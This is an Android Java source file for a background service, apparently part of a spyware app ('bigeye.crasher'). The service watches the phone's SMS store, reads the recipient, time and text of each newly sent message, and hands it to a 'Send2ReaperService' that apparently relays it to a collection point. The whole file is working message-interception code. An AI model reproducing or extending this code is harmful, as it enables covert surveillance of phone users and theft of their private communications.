package com.bigeye.crasher;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.text.format.DateFormat;
import android.util.Log;
import android.widget.Toast;

/*
 * 		PURPOSE
 * - Runs in the background 
 * - monitors for changes in the sms content provider - outgoing sms 
 * - any outgoing sms sent will trigger this service to send it to reaper
 *   
 */

public class OutgoingSMSService extends Service{

	public String APP_TAG = "OutgoingSMSService";
	
	ContentResolver contentResolver;
	ContentObserver smsContentObserver;
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId){
		Log.i(APP_TAG,"Starting outgoing sms service ...");
		return START_STICKY;
	}
	
	@Override
	public void onCreate(){
		
		contentResolver = getContentResolver();
		
		Log.i(APP_TAG,"oncreate fired!");
		
		smsContentObserver = new ContentObserver(new Handler()) {
			public int counter = 1;
			
			@Override
			public void onChange(boolean selfChange){
				
				Log.i(APP_TAG,"counter >>>"+counter);
				//send to repo
				if(counter == 3){

					Uri smsURI = Uri.parse("content://sms/sent");
					String[] columns = new String[]{"address","date","body"};
					Cursor c = getContentResolver().query(smsURI,columns, null,null,null);
					
					//nav to 1st row, most recently sent
					c.moveToPosition(0);
					
					String dest = c.getString(c.getColumnIndex(columns[0]));
					Long date = c.getLong(c.getColumnIndex(columns[1]));
					String smsContent = c.getString(c.getColumnIndex(columns[2]));
					
					String tmp_dt=new DateFormat().format("dd-MMM-yyyy k:m:s", date).toString();
					
					String finalText = "sms to :"+dest+": "+smsContent+": "+ tmp_dt;
//					String finalText = dest+": "+smsContent+": "+ date+"<<< "+c.getPosition()+">>>";
					
					Toast.makeText(getApplicationContext(), finalText, Toast.LENGTH_LONG).show();
					Log.i(APP_TAG,"CNT: >>"+counter+" ::: "+ finalText);				

					Intent SvcIntent = new Intent(getApplicationContext(), Send2ReaperService.class);
					SvcIntent.putExtra("OPERATION", "OUTGOING");
					SvcIntent.putExtra("MSG", finalText);
					startService(SvcIntent);
					Log.i(APP_TAG,"counter: "+counter+">> "+smsContent+">>>THIS");
					counter = 0;
				}
				
				//close cursor
//				c.close();
				
				counter++;
			}
			
			@Override
			public boolean deliverSelfNotifications(){
				return true;
			}
		};
		
		contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsContentObserver);
		
		//kill self
		Log.i(APP_TAG,"No changes in Observer!");
//		stopSelf();
	}
	
	@Override
	public void onDestroy(){
		super.onDestroy();
		
		//unregister observers
		Log.i(APP_TAG,"unregistering observer!");
		contentResolver.unregisterContentObserver(smsContentObserver);
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	
}
